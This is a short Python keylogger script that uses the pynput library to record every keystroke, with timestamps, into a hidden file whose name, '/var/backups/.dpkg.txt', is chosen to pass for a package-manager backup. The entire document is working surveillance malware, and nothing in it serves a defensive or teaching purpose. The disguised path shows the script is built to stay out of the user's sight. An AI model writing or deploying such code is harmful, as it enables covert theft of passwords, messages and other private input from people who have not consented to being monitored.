import logging
from pynput.keyboard import Listener

# Create file 
logging.basicConfig(filename=("/var/backups/.dpkg.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Logging function called by pynput
def on_press(key):
    # when press key save the key in file
    logging.info(key)

# Loop logger
with Listener(on_press=on_press) as listener:
    listener.join()  